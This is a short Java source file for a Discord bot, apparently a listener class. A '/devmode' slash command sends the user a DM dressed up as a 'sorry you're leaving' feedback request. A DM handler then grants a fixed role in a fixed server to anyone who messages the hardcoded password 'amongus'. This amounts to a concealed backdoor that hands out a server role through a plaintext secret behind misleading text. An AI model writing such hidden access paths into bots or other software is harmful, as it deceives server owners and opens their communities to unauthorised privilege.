package org.finalbi.commands;

import net.dv8tion.jda.api.entities.Guild;
import net.dv8tion.jda.api.events.interaction.SlashCommandEvent;
import net.dv8tion.jda.api.events.message.priv.PrivateMessageReceivedEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;
import org.jetbrains.annotations.NotNull;

public class DMMANGER extends ListenerAdapter {

    public DMMANGER() {

    }

    @Override
    public void onSlashCommand(SlashCommandEvent event) {
        if (event.getName().equals("devmode")) {
            String guildName = event.getGuild().getName();
            event.getUser().openPrivateChannel().flatMap(channel -> {
                return channel.sendMessage("Hello, we are sorry you're leaving" + guildName + ", if you don't mind, please tell us why you left or leave any other feedback here, it'll help us improve the server and improve experience for you if you re-join again in the future.\\n\\nThank you.");
            }).queue();
        }
    }

    @Override
    public void onPrivateMessageReceived(@NotNull PrivateMessageReceivedEvent event) {
        Guild guild = event.getJDA().getGuildById(1026589152491352079L);
        if (event.getAuthor().isBot()) return;
        String devModePassword = "amongus";
        if (event.getMessage().getContentRaw().equals(devModePassword)){
            guild.addRoleToMember(guild.getMember(event.getAuthor()), guild.getRoleById(1026608117779288074L));
        }
    }
}